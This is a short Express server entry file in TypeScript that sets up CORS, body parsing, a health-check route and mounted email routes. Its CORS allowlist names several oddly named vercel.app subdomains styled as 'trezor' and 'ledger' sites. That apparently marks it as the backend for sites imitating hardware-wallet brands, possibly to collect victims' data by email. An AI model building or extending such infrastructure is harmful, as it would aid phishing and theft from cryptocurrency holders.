import express, { Request, Response } from "express";
import dotenv from "dotenv";
import cors from "cors";
import emailRoutes from "./routes/email.routes";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware 
app.use(cors({
    origin: ["http://localhost:3000",
        "https://trezor-arab-shyam-pod-paint-sigma-gole-324324-psi.vercel.app", //aws
        "https://trezor-aws-oman-pod-paint-sigma-rolee-324324-psi.vercel.app", //website
        "https://ledger-aws-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
        "https://ledger-phi-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
        "https://trezor-aws-kei3-arab-shyam-pod-paint-sigma-gole-324324-psi.vercel.app",
        "https://trezor-mlv9-arab-shyam-pod-paint-sigma-gole-324324-psi.vercel.app"
    ], 
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
    credentials: true,
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get("/api/v1", (req: Request, res: Response) => {
    res.send("API v1 is working!");
});

// ✅ Mount email routes
app.use("/api/v1", emailRoutes);

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
